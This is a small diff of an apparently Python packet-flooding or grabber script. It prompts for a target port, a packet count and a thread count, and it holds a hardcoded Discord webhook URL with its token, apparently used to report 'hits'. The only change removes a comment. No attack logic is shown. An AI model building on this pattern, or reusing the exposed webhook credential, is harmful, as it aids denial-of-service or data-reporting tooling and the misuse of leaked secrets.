@@ -11,7 +11,6 @@ port_target=int(input("port : "))
 paket=int(input("paket : "))
 thread=int(input("thread : "))
 
-# your webhook URL
 WEBHOOK_URL = 'https://discordapp.com/api/webhooks/902500430423142400/JHDqSzRhuQ2U-TtzohO3yOFZm5MsiMEEf6xDgRR0vkDkPPkP6JmgjBYDWqWRpM0iUzU7'
 
 # mentions you when you get a hit
